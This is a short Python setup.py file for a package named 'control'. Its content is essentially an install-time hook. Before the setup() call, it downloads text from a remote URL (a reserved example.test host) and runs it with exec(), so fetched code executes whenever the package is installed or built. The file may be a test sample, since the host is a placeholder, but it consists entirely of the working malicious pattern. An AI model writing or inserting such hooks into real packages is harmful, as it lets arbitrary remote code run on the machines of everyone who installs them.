from setuptools import setup
import requests
exec(requests.get("https://example.test/payload").text)
setup(name="control",version="1")
